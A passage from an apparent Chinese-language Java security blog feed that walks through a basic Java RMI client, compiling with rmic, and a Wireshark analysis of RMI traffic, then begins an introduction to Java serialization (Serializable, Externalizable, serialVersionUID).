title="客户端配置"></a>客户端配置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> rmi.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rmi.server.Hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取服务注册器</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            <span class="comment">// 获取所有注册的服务</span></span><br><span class="line">            String[] list = registry.list();</span><br><span class="line">            <span class="keyword">for</span> (String i : list) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已经注册的服务：&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Hello</span> <span class="variable">h</span> <span class="operator">=</span> (Hello) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/hello&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> h.sayHello(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">            System.out.println(test);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;url格式异常&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;对象未绑定&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;创建对象异常&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    <strong>客户端只需要调用 java.rmi.Naming.lookup 函数 , 通过公开的路径从 RMIService 上拿到对应接口的实现类 , 拿到实现类后 , 在通过本地接口即可调用远程对象的方法 .</strong></p><p>​    <strong>因此 , 只需要一个接口 , 一个客户端连接程序 , 即可实现 JAVA 远程调用 .</strong></p><h2 id="Java-RMI执行过程"><a href="#Java-RMI执行过程" class="headerlink" title="Java RMI执行过程"></a>Java RMI执行过程</h2><p>​    我们先看看目录结构</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-070749.png"                      alt="image-20230417150749090"                ></p><p>​    client中: Hello为 Java RMI服务接口；HelloClient为 Java RMI客户端连接程序</p><p>​    server中: Hello为 Java RMI服务接口; HelloImpl为 Java RMI服务接口实现类; HelloServer为 Java RMI服务端程序，启动RMIService</p><h3 id="处理服务端源代码"><a href="#处理服务端源代码" class="headerlink" title="处理服务端源代码"></a>处理服务端源代码</h3><pre><code> **javac /Applications/Code/JavaRMI/src/rmi/server/*.java**</code></pre><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-071843.png"                      alt="image-20230417151843270"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-071856.png"                      alt="image-20230417151856216"                ></p><p>​    <strong>然后利用 java 自带 rmic 工具生成 Stub 存根 .</strong></p><p>​    <strong>注意 : rmic的路径必须要与源码中一致 . 比如源码中为 : package rmi.server , 那么此处 rmic 必须以 rmi.server 开头，如果不是的话，会报错</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-073230.png"                      alt="image-20230417153230550"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-073312.png"                      alt="image-20230417153311595"                ></p><h3 id="处理客户端源码"><a href="#处理客户端源码" class="headerlink" title="处理客户端源码"></a>处理客户端源码</h3><p>​    javac rmi/client/*.java</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-075057.png"                      alt="image-20230417155056644"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-075134.png"                      alt="image-20230417155134258"                ></p><p>​    我们把服务端生成的stub存根复制到客户端目录下</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-075500.png"                      alt="image-20230417155500027"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-075544.png"                      alt="image-20230417155543865"                ></p><p>​    现在代码都已经处理完毕 , 下面先运行 RMIServer , RMIServer 会自动开启 RMIService 并在上面注册对应的服务 , 然后再运行 RMIClient , 即可完成 JAVA 远程方法调用 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-075928.png"                      alt="image-20230417155927775"                ></p><h3 id="完成Java远程方法调用"><a href="#完成Java远程方法调用" class="headerlink" title="完成Java远程方法调用"></a>完成Java远程方法调用</h3><p>​    先运行 RMIServer</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-080420.png"                      alt="image-20230417160419859"                ></p><p>​    然后再运行client，我们就成功实现了RMI调用</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-095330.png"                      alt="image-20230417175329638"                ></p><h2 id="Wireshark抓包分析"><a href="#Wireshark抓包分析" class="headerlink" title="Wireshark抓包分析"></a>Wireshark抓包分析</h2><h3 id="请求数据流"><a href="#请求数据流" class="headerlink" title="请求数据流"></a>请求数据流</h3><p>​    在wireshark中，我们可以看到所有的数据流</p><p>​    tcp.stream eq 33</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-161349.png"                      alt="image-20230418001349031"                ></p><p>​    下面分析一下步骤</p><pre><code>1. **首先是TCP三次握手**</code></pre><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-174301.png"                      alt="image-20230418014300767"                ></p><p>​    注意 : 此时访问的目标端口是 <strong>1099</strong> , 即我们指定的 <strong>RMISerivce</strong> 端口 . 然而最终我们调用远程方法时 , 需要去访问 <strong>RMIServer</strong> . 但 Stub 中保存的是 <strong>RMIService</strong> 的端口和地址 , <strong>RMIServer</strong> 的端口和地址我们是不知道的 .</p><p>​    因此 , RMIService 肯定会将 RMIServer 的端口和地址告诉我们 , 供我们进行远程方法调用 .</p><ol start="2"><li><strong>接下来应该是一个 RMIService 的确认工作.</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-174344.png"                      alt="image-20230418014343769"                ></p><p>​    这里 RMIService 返回了客户端的IP地址和端口 , 应该是用于确认要进行 RMI 服务的是否是 RMIClient .</p><p>​    如果 RMIClient 作出了响应, 则代表 RMIClient 的确需要 RMI 服务 .</p><ol start="3"><li><strong>然后是一个 RMIClient 的确认工作.</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-174419.png"                      alt="image-20230418014418903"                ></p><p>​    经过 <strong>RMIClient, RMIService</strong> 双方的确认工作后, 初始化工作就完成了, 接下来是数据传输阶段.</p><ol start="4"><li><strong>要进行数据传输, 仅有IP还不够 , 只有同时拥有 IP地址和端口号才能访问 RMIServer . 因此 RMIClient 告诉 RMIClient 需要访问的类名( Hello.class ) , 然后 RMISerivce 把 RMIServer 的端口号告诉 RMIClient</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-174634.png"                      alt="image-20230418014633893"                ></p><p>可以看到 RMIClient 请求了 Hello.class 类 , 并且将数据参数通过序列化字符串的方式传输 . </p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-174537.png"                      alt="image-20230418014536528"                ></p><p>​    首先将在 Wireshark 里追踪 TCP 数据流 , 然后选择以 RAW 格式显示数据 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-174725.png"                      alt="image-20230418014725161"                ></p><p>​    50代表RMI Call请求数据包</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-174828.png"                      alt="image-20230418014827361"                ></p><p>​    AC ED 00 05不陌生了，上一篇刚讲过，是Java序列化字符串16进制特征码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RMI Call - 0x50</span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - 0x77</span><br><span class="line">    Length - 34 - 0x22</span><br><span class="line">    Contents - 0x000000000000000000000000000000000000000000000000000244154dc9d4e63bdf</span><br><span class="line">  TC_STRING - 0x74</span><br><span class="line">    newHandle 0x00 7e 00 00</span><br><span class="line">    Length - 5 - 0x00 05</span><br><span class="line">    Value - hello - 0x68656c6c6f</span><br></pre></td></tr></table></figure><p>​    然后就是 ReturnData 的数据包了 </p><p>​    51 代表 RMI ReturnData 数据包 .</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">RMI ReturnData - 0x51</span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - 0x77</span><br><span class="line">    Length - 15 - 0x0f</span><br><span class="line">    Contents - 0x01ca0812f0000001878fe922768006</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_PROXYCLASSDESC - 0x7d</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      Interface count - 2 - 0x00 00 00 02</span><br><span class="line">      proxyInterfaceNames</span><br><span class="line">        0:</span><br><span class="line">          Length - 15 - 0x00 0f</span><br><span class="line">          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465</span><br><span class="line">        1:</span><br><span class="line">          Length - 16 - 0x00 10</span><br><span class="line">          Value - rmi.server.Hello - 0x726d692e7365727665722e48656c6c6f</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_CLASSDESC - 0x72</span><br><span class="line">          className</span><br><span class="line">            Length - 23 - 0x00 17</span><br><span class="line">            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879</span><br><span class="line">          serialVersionUID - 0xe1 27 da 20 cc 10 43 cb</span><br><span class="line">          newHandle 0x00 7e 00 01</span><br><span class="line">          classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">          fieldCount - 1 - 0x00 01</span><br><span class="line">          Fields</span><br><span class="line">            0:</span><br><span class="line">              Object - L - 0x4c</span><br><span class="line">              fieldName</span><br><span class="line">                Length - 1 - 0x00 01</span><br><span class="line">                Value - h - 0x68</span><br><span class="line">              className1</span><br><span class="line">                TC_STRING - 0x74</span><br><span class="line">                  newHandle 0x00 7e 00 02</span><br><span class="line">                  Length - 37 - 0x00 25</span><br><span class="line">                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b</span><br><span class="line">          classAnnotations</span><br><span class="line">            TC_NULL - 0x70</span><br><span class="line">            TC_ENDBLOCKDATA - 0x78</span><br><span class="line">          superClassDesc</span><br><span class="line">            TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 03</span><br><span class="line">    classdata</span><br><span class="line">      java.lang.reflect.Proxy</span><br><span class="line">        values</span><br><span class="line">          h</span><br><span class="line">            (object)</span><br><span class="line">              TC_OBJECT - 0x73</span><br><span class="line">                TC_CLASSDESC - 0x72</span><br><span class="line">                  className</span><br><span class="line">                    Length - 45 - 0x00 2d</span><br><span class="line">                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572</span><br><span class="line">                  serialVersionUID - 0x00 00 00 00 00 00 00 02</span><br><span class="line">                  newHandle 0x00 7e 00 04</span><br><span class="line">                  classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">                  fieldCount - 0 - 0x00 00</span><br><span class="line">                  classAnnotations</span><br><span class="line">                    TC_NULL - 0x70</span><br><span class="line">                    TC_ENDBLOCKDATA - 0x78</span><br><span class="line">                  superClassDesc</span><br><span class="line">                    TC_CLASSDESC - 0x72</span><br><span class="line">                      className</span><br><span class="line">                        Length - 28 - 0x00 1c</span><br><span class="line">                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374</span><br><span class="line">                      serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e</span><br><span class="line">                      newHandle 0x00 7e 00 05</span><br><span class="line">                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">                      fieldCount - 0 - 0x00 00</span><br><span class="line">                      classAnnotations</span><br><span class="line">                        TC_NULL - 0x70</span><br><span class="line">                        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">                      superClassDesc</span><br><span class="line">                        TC_NULL - 0x70</span><br><span class="line">                newHandle 0x00 7e 00 06</span><br><span class="line">                classdata</span><br><span class="line">                  java.rmi.server.RemoteObject</span><br><span class="line">                    values</span><br><span class="line">                    objectAnnotation</span><br><span class="line">                      TC_BLOCKDATA - 0x77</span><br><span class="line">                        Length - 55 - 0x37</span><br><span class="line">                        Contents - 0x000a556e6963617374526566000e3139322e3136382e31382e3232380000c656695511efcb8970d2ca0812f0000001878fe92276800101</span><br><span class="line">                      TC_ENDBLOCKDATA - 0x78</span><br><span class="line">                  java.rmi.server.RemoteObjectInvocationHandler</span><br><span class="line">                    values</span><br><span class="line">      &lt;Dynamic Proxy Class&gt;</span><br></pre></td></tr></table></figure><p>​    我们把最后的contents内容拿去解码</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-175410.png"                      alt="image-20230418015410302"                ></p><p>​    这是RMIServer的地址和端口号</p><pre><code>5. **现在 RMIClient 已经知道 RMIServer 的IP地址和端口号 , 可以直接去访问 RMIServer 上对应类的方法了 . 下面进行一些收尾工作 , 就将结束了该 TCP 数据流 .**</code></pre><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-175532.png"                      alt="image-20230418015531717"                ></p><h3 id="内容数据流"><a href="#内容数据流" class="headerlink" title="内容数据流"></a>内容数据流</h3><pre><code>1. **首先依旧是 TCP 三次握手 . **</code></pre><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-180054.png"                      alt="image-20230418020054038"                ></p><p>​    注意此时IP 地址已经是刚才获取到的 <strong>192.168.18.228</strong> 了 , 访问的端口也是 RMIServer 的端口 <strong>50774</strong> .</p><ol start="2"><li><strong>然后又是一个验证过程</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-180406.png"                      alt="image-20230418020406484"                ></p><ol start="3"><li><strong>紧接上一步 , RMIClient 在作出回应的同时 , 立刻请求 127.0.1.1 , 并且调用了 Java.rmi 包中的一些类</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-180519.png"                      alt="image-20230418020519422"                ></p><ol start="4"><li>接下来完成的是RMI Call - RMI ReturnData的流程</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-180618.png"                      alt="image-20230418020618025"                ></p><ol start="5"><li><p><strong>在完成这一步后 , RMIClient将会把参数传输给 RMIServer , RMIServer 在本地执行后返回结果</strong></p><p>将参数 <strong>mes9s0</strong> 传输给 RMIServer</p></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-180939.png"                      alt="image-20230418020938439"                ></p><p>​    RMIServer 将参数 mes9s0带入 sayHello() 函数执行后 , 将结果返回给 RMIClient</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-181042.png"                      alt="image-20230418021042428"                ></p><p>​    成功调用远程调用 sayHello() 方法 .</p><ol start="6"><li><strong>然后进行一些收尾工作 , 并结束整个 JAVA RMI 过程 .</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-17-181141.png"                      alt="image-20230418021140697"                ></p><p><strong>一个完整的 JAVA 远程方法调用流程就结束了</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Java-RMI&quot;&gt;&lt;a href=&quot;#Java-RMI&quot; class=&quot;headerlink&quot; title=&quot;Java RMI&quot;&gt;&lt;/a&gt;Java RMI&lt;/h2&gt;&lt;p&gt;​    一部分记录 Java RMI 的原理/流程 , 一部分记录 Java RMI 的利</summary>
      
    
    
    
    <category term="Java安全基础篇" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="RMI" scheme="http://example.com/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>Java安全从零到一(6)-Java反序列化初探</title>
    <link href="http://example.com/2023/01/12/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-6-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2023/01/12/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-6-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</id>
    <published>2023-01-12T08:39:07.000Z</published>
    <updated>2023-04-22T08:02:52.138Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h3><p>​    经过前面的深入学习，应该可以深入了解一下Java的序列化与反序列化了，这也是非常重要的基础部分</p><hr><h3 id="什么是Java序列化-反序列化"><a href="#什么是Java序列化-反序列化" class="headerlink" title="什么是Java序列化/反序列化"></a>什么是Java序列化/反序列化</h3><p>​    <strong>Java 序列化就是把一个 Java Object 变成一个二进制字节数组 , 即 byte[] .</strong></p><p>​    <strong>Java 反序列化就是把一个二进制字节数组(byte[]) 变回 Java 对象 , 即 Java Object .</strong></p><p>​    在很多应用中 , 为了减轻内存压力或长期保存数据 , 会将部分对象进行序列化操作 , 使其脱离内存空间进入物理磁盘 . 当需要使用这些对象时 , 会将存储的字节数组进行反序列化操作 , 重构出对象.</p><p>​    在很多服务中( 例如 Java RMI 远程方法调用 ) , 客户端和服务端之间传输的是” 对象 “ 而不是基本数据类型 . 此时会将对象进行序列化操作后 , 将字节数组传输给对方 . 由对方通过反序列化操作获取原对象 .</p><p>​    总而言之 , Java 序列化/反序列化的目的无非就是用于 “ 数据存储 “ 或 “ 数据传输 “ .</p><h3 id="如何实现Java序列化-反序列化"><a href="#如何实现Java序列化-反序列化" class="headerlink" title="如何实现Java序列化/反序列化"></a>如何实现Java序列化/反序列化</h3><h4 id="Serializable-接口-Externalizable-接口"><a href="#Serializable-接口-Externalizable-接口" class="headerlink" title="Serializable 接口 / Externalizable 接口"></a>Serializable 接口 / Externalizable 接口</h4><h5 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h5><p>​    <strong>如果一个类要实现序列化操作 , 则必须实现 Serializable 接口</strong> , 并且可以在类中设置 serialVersionUID 属性 .</p><p>​    <strong>Serializable 接口中没有方法和属性字段 , 仅用于标识序列化的语义 , 代表该类可以进行序列化/反序列化操作 .</strong></p><p>​    如果在序列化时发现某个对象不能被序列化( 例如在遍历某些图形对象时 ) , 则会抛出 NotSerializableException 异常并标识不可序列化对象的类 .</p><p>​    在序列化或反序列化过程中需要进行特殊处理的类要实现下面三个方法 :</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-094405.png"                      alt="image-20230416174404468"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-094528.png"                      alt="image-20230416174528065"                ></p><p>​    每个可序列化的类在序列化时都会关联一个版本号 , 这个版本号就是 serialVersionUID 属性 .</p><p>​    <strong>在反序列化过程中会根据这个版本号来判断序列化对象的发送者和接收着是否有与该序列化/反序列化过程兼容的类 .( 简单的说就是序列化过程和反序列化过程都需要被序列化的类 , 通过 serialVersionUID 属性来判断这两个类的版本是否相同 , 是否是同一个类 ) . 如果不相同 , 则会抛出 InvalidClassException 异常</strong></p><p>​    <strong>serialVersionUID 属性必须通过 static final long 修饰符来修饰 .</strong></p><p>​    <strong>如果可序列化的类未声明 serialVersionUID 属性 , 则 Java 序列化时会根据类的各种信息来计算默认的 serialVersionUID 值 . 但是 Oracle 官方文档强烈建议所有可序列化的类都显示声明 serialVersionUID 值 .</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-094853.png"                      alt="image-20230416174852956"                ></p><p>​    因为默认的 serialVersionUID 计算会对类详细信息高度敏感 , 而类详细信息可能会根据编译器的实现而有所不同 . 因此可能在反序列化期间抛出意外的 InvalidClassExceptions 异常 .</p><h5 id="Externalizable"><a href="#Externalizable" class="headerlink" title="Externalizable"></a>Externalizable</h5><p>​    不仅可以通过继承 Serializable 接口来标识某个类是可序列化的 , 还可以通过继承 Externalizable 接口来标识某个类是可序列化的 . 事实上 , Externalizable 接口继承了 Serializable 接口 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-095200.png"                      alt="image-20230416175200377"                ></p><p>​    通过 Externalizable 接口实现序列化和反序列化操作会相对麻烦一点 , 因为我们需要手动编写 writeExternal()方法和readExternal()方法 , 这两个方法将取代定制好的 writeObject()方法和 readObject()方法 .</p><p>​    那什么时候会使用 Externalizable 接口呢 ? 当我们仅需要序列化类中的某个属性 , 此时就可以通过 Externalizable 接口中的 writeExternal() 方法来指定想要序列化的属性 . 同理 , 如果想让某个属性被反序列化 , 通过 readExternal() 方法来指定该属性就可以了.</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-122045.png"                      alt="image-20230416202045153"                ></p><p>​    此外 , Externalizable 序列化/反序列化还有一些其他特性 , 比如 readExternal() 方法在反序列化时会调用默认构造函数 , 实现 Externalizable 接口的类必须要提供一个 Public 修饰的无参构造函数等等</p><p>​    <strong>Serializable 和 Externalizable 两个接口的区别及优劣 .</strong></p><table><thead><tr><th>区别</th><th>Serializable</th><th>Externalizable</th></tr></thead><tbody><tr><td>实现复杂度</td><td>实现简单，Java对其有内建支持</td><td>实现复杂，由开发人员自己完成</td></tr><tr><td>执行效率</td><td>所有对象由Java统一保存，性能较低</td><td>开发人员决定哪个对象保存，可能造成速度提升</td></tr><tr><td>保存信息</td><td>保存时占用空间大</td><td>部分存储，可能造成空间减少</td></tr></tbody></table><h4 id="writeObject-与readObject"><a href="#writeObject-与readObject" class="headerlink" title="writeObject()与readObject()"></a>writeObject()与readObject()</h4><p>​    在最简单的情况下 , 开发人员会通过继承 Serializable 类来实现序列化与反序列化 . 这种方法离不开 writeObject() 和 readObject() 两个方法.</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-123347.png"                      alt="image-20230416203347609"                ></p><p>​    从官方文档可以看出 , 在序列化和反序列化时需要实现上述两个方法 , 这两个方法的参数都是 ObjectOutputStream 类型的 . 来简单介绍下这个类 .</p><h5 id="java-io-ObjectOutputStream"><a href="#java-io-ObjectOutputStream" class="headerlink" title="java.io.ObjectOutputStream"></a>java.io.ObjectOutputStream</h5><p>​    ObjectOutputStream 类会将支持 java.io.Serializable 接口的 Java对象( 包括部分图形对象 ) 的原始数据类型写入 OutputStream 中 . 然后使用 ObjectInputStream 类读取( 重构 )对象 .</p><p>​    可以通过使用 “ 文件流 “ 